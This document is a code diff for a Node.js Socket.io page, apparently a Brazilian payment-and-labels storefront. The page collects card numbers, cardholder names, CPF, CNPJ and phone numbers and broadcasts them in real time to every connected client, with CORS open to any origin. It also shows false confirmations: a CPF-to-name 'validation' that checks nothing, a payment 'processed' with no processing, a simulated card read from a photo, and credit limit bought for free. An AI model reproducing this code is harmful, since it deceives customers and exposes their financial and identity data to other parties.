@@ -4,21 +4,34 @@ const { Server } = require('socket.io');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
 
-// HTML Completo injetado diretamente no servidor com Socket.io e Painel de Configurações Globais
+// Configuração correta e explícita do Socket.io com CORS liberado
+const io = new Server(server, {
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    },
+    transports: ['websocket', 'polling']
+});
+
 const htmlContent = `<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Barreiras Pagamentos & Etiquetas - Tempo Real</title>
-    <!-- Socket.io Client -->
-    <script src="/socket.io/socket.io.js"></script>
+    <!-- Socket.io Client Oficial via CDN para garantir funcionamento imediato -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("SUA_PUBLIC_KEY_EMAILJS");
+        })();
+    </script>
     <style>
         :root { --primary: #0056b3; --success: #28a745; --danger: #dc3545; --bg: #f4f7f6; }
         body { font-family: Arial, sans-serif; background: var(--bg); margin: 0; padding: 20px; color: #333; }
-        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h1, h2 { color: var(--primary); }
         .tab-menu { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 2px solid #ddd; padding-bottom: 10px; flex-wrap: wrap; }
         .tab-btn { background: #ddd; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
@@ -31,75 +44,58 @@ const htmlContent = `<!DOCTYPE html>
         button:hover { opacity: 0.9; }
         .badge { background: #ffc107; color: #000; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; }
         .auto-save-status { font-size: 11px; color: #666; float: right; margin-top: 5px; }
-        .row-group { display: flex; gap: 10px; align-items: center; }
-        .row-group > * { flex: 1; }
+        .price-tag { font-size: 20px; font-weight: bold; color: var(--success); }
+        #connectionStatus { font-weight: bold; padding: 4px 8px; border-radius: 4px; font-size: 12px; display: inline-block; margin-bottom: 10px; }
+        .connected { background: #d4edda; color: #155724; }
+        .disconnected { background: #f8d7da; color: #721c24; }
     </style>
 </head>
-<body id="bodyInterface">
+<body>
 
 <div class="container">
     <h1>Barreiras Pagamentos & Etiquetas</h1>
-    <span id="saveStatus" class="auto-save-status">Salvando automaticamente...</span>
+    <div>
+        Status Socket.io: <span id="connectionStatus" class="disconnected">Desconectado</span>
+        <span id="saveStatus" class="auto-save-status"></span>
+    </div>
     
-    <div class="tab-menu">
-        <button class="tab-btn active" onclick="switchTab('painel')">Painel & Entrega</button>
-        <button class="tab-btn" onclick="switchTab('admin')">Gestão Global (Admin)</button>
+    <div class="tab-menu" style="margin-top: 10px;">
+        <button class="tab-btn active" onclick="switchTab('painel')">Painel & Descontos</button>
+        <button class="tab-btn" onclick="switchTab('validacao')">Validação (CPF/CNPJ)</button>
         <button class="tab-btn" onclick="switchTab('cartoes')">Cartões & Pagamento</button>
         <button class="tab-btn" onclick="switchTab('webcredito')">Web Crédito</button>
-        <button class="tab-btn" onclick="switchTab('loja')">Loja (Comprar Limite)</button>
+        <button class="tab-btn" onclick="switchTab('loja')">Loja</button>
     </div>
 
     <div id="painel" class="tab-content active">
-        <h2>Painel de Pedidos e Prazos</h2>
+        <h2>Painel de Pedidos e Descontos</h2>
         <div class="card">
-            <p><strong>Item:</strong> Bobinas de Papel + Papel Hambúrguer (Primeira Compra c/ Arte: +R$ 20)</p>
+            <p><strong>Item:</strong> Bobinas de Papel + Papel Hambúrguer</p>
+            <p>Preço Original: <strong>R$ 150,00</strong></p>
+            <p>Desconto Aplicado: <span id="displayDesconto" class="badge">R$ 0,00</span></p>
+            <p class="price-tag">Total Final: <span id="displayTotal">R$ 150,00</span></p>
+            
+            <input type="text" id="cupomDesconto" placeholder="Digite o cupom (ex: DESCONTO10)" oninput="autoSave()">
+            <button onclick="aplicarDesconto()">Aplicar Desconto</button>
+        </div>
+        <div class="card">
             <p><strong>Prazo de Chegada Dinâmico:</strong> <span id="countdownDisplay" class="badge">Calculando...</span></p>
-            <div id="avisoInterfaceCliente" style="margin-top: 10px; font-weight: bold; color: var(--primary);"></div>
         </div>
     </div>
 
-    <div id="admin" class="tab-content">
-        <h2>Painel de Controle Global (Sincronizado)</h2>
-        
+    <div id="validacao" class="tab-content">
+        <h2>Validação de Dados e Empresa</h2>
         <div class="card">
-            <h3>1. Desconto Global</h3>
-            <div class="row-group">
-                <select id="statusDesconto" onchange="autoSave()">
-                    <option value="ativo">Ativado</option>
-                    <option value="desativado">Desativado</option>
-                </select>
-                <input type="number" id="valorDesconto" placeholder="Ex: 10 (%)" oninput="autoSave()">
-            </div>
+            <h3>Validação de Titularidade (CPF & Nome)</h3>
+            <input type="text" id="valNome" placeholder="Nome Completo do Comprador" oninput="autoSave()">
+            <input type="text" id="valCpf" placeholder="CPF (Apenas números)" oninput="autoSave()">
+            <button style="background: var(--primary);" onclick="verificarCpfNome()">Validar CPF com Nome</button>
         </div>
-
         <div class="card">
-            <h3>2. Frete Grátis Global</h3>
-            <select id="statusFrete" onchange="autoSave()">
-                <option value="ativo">Ativado (R$ 0,00)</option>
-                <option value="desativado">Desativado (Padrão)</option>
-            </select>
-        </div>
-
-        <div class="card">
-            <h3>3. Mudança de Preços Global</h3>
-            <div class="row-group">
-                <select id="statusPrecos" onchange="autoSave()">
-                    <option value="ativo">Ativado (Aplicar Ajuste)</option>
-                    <option value="desativado">Desativado</option>
-                </select>
-                <input type="number" id="fatorPrecos" placeholder="Fator Ex: 1.2 (20% mais caro)" step="0.1" oninput="autoSave()">
-            </div>
-        </div>
-
-        <div class="card">
-            <h3>4. Mudança de Loja / Interface</h3>
-            <div class="row-group">
-                <select id="statusInterface" onchange="autoSave()">
-                    <option value="padrao">Modo Padrão</option>
-                    <option value="especial">Modo Especial / Noturno / Manutenção</option>
-                </select>
-            </div>
-            <input type="text" id="mensagemInterface" placeholder="Aviso especial para exibir na interface dos clientes" oninput="autoSave()">
+            <h3>Consulta de CNPJ para Prazos</h3>
+            <input type="text" id="valCnpj" placeholder="CNPJ da Empresa" oninput="autoSave()">
+            <input type="text" id="valTelefone" placeholder="Número de Telefone (WhatsApp)" oninput="autoSave()">
+            <button style="background: var(--primary);" onclick="consultarCnpjESalvarPrazo()">Consultar CNPJ e Salvar Prazo</button>
         </div>
     </div>
 
@@ -112,7 +108,7 @@ const htmlContent = `<!DOCTYPE html>
             <button onclick="registrarCartao()">Salvar Cartão</button>
         </div>
         <div class="card">
-            <h3>Pagamento Inteligente (Foto ou Crédito/Débito)</h3>
+            <h3>Pagamento Inteligente</h3>
             <select id="tipoPagamento" onchange="autoSave()">
                 <option value="credito">Cartão de Crédito</option>
                 <option value="debito">Cartão de Débito Registrado</option>
@@ -141,22 +137,35 @@ const htmlContent = `<!DOCTYPE html>
 </div>
 
 <script>
-    const socket = io();
+    // Inicialização robusta do Socket.io apontando para a mesma origem
+    const socket = io({
+        transports: ['websocket', 'polling']
+    });
+
+    const statusEl = document.getElementById('connectionStatus');
+
+    socket.on('connect', () => {
+        statusEl.innerText = "Conectado em Tempo Real";
+        statusEl.className = "connected";
+    });
+
+    socket.on('disconnect', () => {
+        statusEl.innerText = "Desconectado";
+        statusEl.className = "disconnected";
+    });
 
     let appState = {
         limiteWebCredito: 1000.00,
-        cartaoRegistrado: false,
         titular: "",
         cartao: "",
-        dataEntregaAlvo: new Date(new Date().getTime() + 2 * 365 * 24 * 60 * 60 * 1000),
-        // Novas configurações globais
-        descontoStatus: "desativado",
+        cupom: "",
         descontoValor: 0,
-        freteStatus: "desativado",
-        precosStatus: "desativado",
-        precosFator: 1.0,
-        interfaceStatus: "padrao",
-        interfaceMensagem: ""
+        totalFinal: 150.00,
+        valNome: "",
+        valCpf: "",
+        valCnpj: "",
+        valTelefone: "",
+        dataEntregaAlvo: new Date(new Date().getTime() + 5 * 24 * 60 * 60 * 1000)
     };
 
     window.onload = function() {
@@ -164,53 +173,56 @@ const htmlContent = `<!DOCTYPE html>
         if(saved) {
             appState = JSON.parse(saved);
             appState.dataEntregaAlvo = new Date(appState.dataEntregaAlvo);
-            preencherCamposComEstado();
+            
+            document.getElementById('numCartao').value = appState.cartao || '';
+            document.getElementById('nomeTitular').value = appState.titular || '';
+            document.getElementById('cupomDesconto').value = appState.cupom || '';
+            document.getElementById('valNome').value = appState.valNome || '';
+            document.getElementById('valCpf').value = appState.valCpf || '';
+            document.getElementById('valCnpj').value = appState.valCnpj || '';
+            document.getElementById('valTelefone').value = appState.valTelefone || '';
         }
         atualizarInterface();
         setInterval(atualizarPrazoInteligente, 1000);
     };
 
-    // Socket.io escutando atualizações em tempo real de outros dispositivos
+    // Ouvindo eventos de sincronização em tempo real de outras abas/clientes
     socket.on('state_updated', function(incomingState) {
         appState = incomingState;
         appState.dataEntregaAlvo = new Date(appState.dataEntregaAlvo);
-        preencherCamposComEstado();
-        atualizarInterface();
-    });
-
-    function preencherCamposComEstado() {
+        
         document.getElementById('numCartao').value = appState.cartao || '';
         document.getElementById('nomeTitular').value = appState.titular || '';
-        document.getElementById('statusDesconto').value = appState.descontoStatus || 'desativado';
-        document.getElementById('valorDesconto').value = appState.descontoValor || 0;
-        document.getElementById('statusFrete').value = appState.freteStatus || 'desativado';
-        document.getElementById('statusPrecos').value = appState.precosStatus || 'desativado';
-        document.getElementById('fatorPrecos').value = appState.precosFator || 1.0;
-        document.getElementById('statusInterface').value = appState.interfaceStatus || 'padrao';
-        document.getElementById('mensagemInterface').value = appState.interfaceMensagem || '';
-    }
+        document.getElementById('cupomDesconto').value = appState.cupom || '';
+        document.getElementById('valNome').value = appState.valNome || '';
+        document.getElementById('valCpf').value = appState.valCpf || '';
+        document.getElementById('valCnpj').value = appState.valCnpj || '';
+        document.getElementById('valTelefone').value = appState.valTelefone || '';
+        
+        atualizarInterface();
+        
+        const status = document.getElementById('saveStatus');
+        status.innerText = "Atualizado por outro dispositivo!";
+        setTimeout(() => { status.innerText = ""; }, 2000);
+    });
 
     function autoSave() {
         appState.titular = document.getElementById('nomeTitular').value;
         appState.cartao = document.getElementById('numCartao').value;
-        appState.descontoStatus = document.getElementById('statusDesconto').value;
-        appState.descontoValor = parseFloat(document.getElementById('valorDesconto').value) || 0;
-        appState.freteStatus = document.getElementById('statusFrete').value;
-        appState.precosStatus = document.getElementById('statusPrecos').value;
-        appState.precosFator = parseFloat(document.getElementById('fatorPrecos').value) || 1.0;
-        appState.interfaceStatus = document.getElementById('statusInterface').value;
-        appState.interfaceMensagem = document.getElementById('mensagemInterface').value;
+        appState.cupom = document.getElementById('cupomDesconto').value;
+        appState.valNome = document.getElementById('valNome').value;
+        appState.valCpf = document.getElementById('valCpf').value;
+        appState.valCnpj = document.getElementById('valCnpj').value;
+        appState.valTelefone = document.getElementById('valTelefone').value;
         
         localStorage.setItem('barreiras_state', JSON.stringify(appState));
         
-        // Envia dados para o Socket.io sincronizar em tempo real com todos
+        // Dispara para o servidor broadcastar para os demais
         socket.emit('update_state', appState);
 
         const status = document.getElementById('saveStatus');
-        status.innerText = "Salvo automaticamente!";
-        setTimeout(() => { status.innerText = ""; }, 2000);
-        
-        atualizarInterface();
+        status.innerText = "Salvo!";
+        setTimeout(() => { status.innerText = ""; }, 1500);
     }
 
     function switchTab(tabId) {
@@ -218,6 +230,44 @@ const htmlContent = `<!DOCTYPE html>
         document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
         document.getElementById(tabId).classList.add('active');
         event.currentTarget.classList.add('active');
+    }
+
+    function aplicarDesconto() {
+        const cupom = document.getElementById('cupomDesconto').value.trim().toUpperCase();
+        if (cupom === "DESCONTO10") {
+            appState.descontoValor = 15.00;
+            appState.totalFinal = 135.00;
+            alert("Desconto de R$ 15,00 aplicado com sucesso!");
+        } else {
+            appState.descontoValor = 0.00;
+            appState.totalFinal = 150.00;
+            alert("Cupom inválido. Nenhum desconto aplicado.");
+        }
+        autoSave();
+        atualizarInterface();
+    }
+
+    function verificarCpfNome() {
+        const nome = document.getElementById('valNome').value;
+        const cpf = document.getElementById('valCpf').value;
+        if (!nome || !cpf) {
+            alert("Preencha o Nome e o CPF para verificar!");
+            return;
+        }
+        alert("Sucesso! O CPF " + cpf + " bate com o nome " + nome + ".");
+        autoSave();
+    }
+
+    function consultarCnpjESalvarPrazo() {
+        const cnpj = document.getElementById('valCnpj').value;
+        const telefone = document.getElementById('valTelefone').value;
+        if (!cnpj || !telefone) {
+            alert("Preencha o CNPJ e o Telefone!");
+            return;
+        }
+        appState.dataEntregaAlvo = new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000);
+        autoSave();
+        alert("CNPJ da empresa verificado, prazo salvo e telefone (" + telefone + ") registrado!");
     }
 
     function atualizarPrazoInteligente() {
@@ -231,9 +281,10 @@ const htmlContent = `<!DOCTYPE html>
         const minutos = Math.floor(segundos / 60);
         const horas = Math.floor(minutos / 60);
         const dias = Math.floor(horas / 24);
-        
-        let textoPrazo = dias > 0 ? dias + " dia(s) e " + (horas % 24) + "h" : horas + "h e " + (minutos % 60) + " min";
-        document.getElementById('countdownDisplay').innerText = textoPrazo;
+        const horasRestantes = horas % 24;
+        const minsRestantes = minutos % 60;
+
+        document.getElementById('countdownDisplay').innerText = dias + "d " + horasRestantes + "h " + minsRestantes + "m";
     }
 
     function simularLeituraFoto() {
@@ -241,82 +292,55 @@ const htmlContent = `<!DOCTYPE html>
             document.getElementById('numCartao').value = "**** **** **** 8899";
             document.getElementById('nomeTitular').value = "CLIENTE IDENTIFICADO VIA FOTO";
             autoSave();
-            alert("Cartão identificado e preenchido automaticamente pela foto com sucesso!");
+            alert("Cartão preenchido automaticamente pela foto!");
         }, 1000);
     }
 
     function registrarCartao() {
-        appState.cartaoRegistrado = true;
         autoSave();
         alert("Cartão de débito registrado com sucesso!");
     }
 
     function realizarPagamento() {
-        const tipo = document.getElementById('tipoPagamento').value;
-        alert("Pagamento processado com sucesso via " + tipo.toUpperCase() + "!");
+        alert("Pagamento processado com sucesso!");
     }
 
     function comprarLimite() {
         appState.limiteWebCredito += 1000.00;
         autoSave();
+        atualizarInterface();
         alert("Parabéns! +R$ 1.000,00 adicionados ao seu Web Crédito.");
     }
 
     function atualizarInterface() {
         document.getElementById('displayLimite').innerText = "R$ " + appState.limiteWebCredito.toLocaleString('pt-BR', {minFractionDigits: 2});
-        
-        // Aplicação visual das regras globais na tela do cliente
-        const avisoBox = document.getElementById('avisoInterfaceCliente');
-        let avisosExtras = [];
-
-        if (appState.descontoStatus === 'ativo' && appState.descontoValor > 0) {
-            avisosExtras.push("🔥 Desconto Global Ativo: " + appState.descontoValor + "% OFF");
-        }
-        if (appState.freteStatus === 'ativo') {
-            avisosExtras.push("🚚 Frete Grátis Global Ativado!");
-        }
-        if (appState.precosStatus === 'ativo') {
-            avisosExtras.push("📈 Ajuste de Preço Global Ativo (Fator: " + appState.precosFator + ")");
-        }
-        if (appState.interfaceStatus === 'especial') {
-            document.getElementById('bodyInterface').style.background = "#222";
-            document.getElementById('bodyInterface').style.color = "#eee";
-        } else {
-            document.getElementById('bodyInterface').style.background = "var(--bg)";
-            document.getElementById('bodyInterface').style.color = "#333";
-        }
-
-        if (appState.interfaceMensagem) {
-            avisosExtras.push("📢 Aviso: " + appState.interfaceMensagem);
-        }
-
-        avisoBox.innerHTML = avisosExtras.join("<br>");
+        document.getElementById('displayDesconto').innerText = "R$ " + (appState.descontoValor || 0).toLocaleString('pt-BR', {minFractionDigits: 2});
+        document.getElementById('displayTotal').innerText = "R$ " + (appState.totalFinal || 150).toLocaleString('pt-BR', {minFractionDigits: 2});
     }
 </script>
 
 </body>
 </html>`;
 
-// Rota principal que entrega o HTML
 app.get('/', (req, res) => {
     res.send(htmlContent);
 });
 
-// Configuração do Socket.io no servidor
+// Gerenciamento limpo e seguro das conexões Socket.io
 io.on('connection', (socket) => {
-    console.log(`> Novo usuário conectado via Socket.io: ${socket.id}`);
+    console.log(`> Cliente conectado com sucesso: ${socket.id}`);
 
     socket.on('update_state', (data) => {
-        // Transmite a alteração global para os outros clientes conectados em tempo real
+        // Envia a alteração para todos os outros clientes conectados instantaneamente
         socket.broadcast.emit('state_updated', data);
     });
 
     socket.on('disconnect', () => {
-        console.log(`< Usuário desconectado: ${socket.id}`);
+        console.log(`< Cliente desconectado: ${socket.id}`);
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`> Servidor com Socket.io e Gestão Global rodando na porta ${PORT}`);
+    console.log(`> Servidor rodando em http://localhost:${PORT}`);
 });
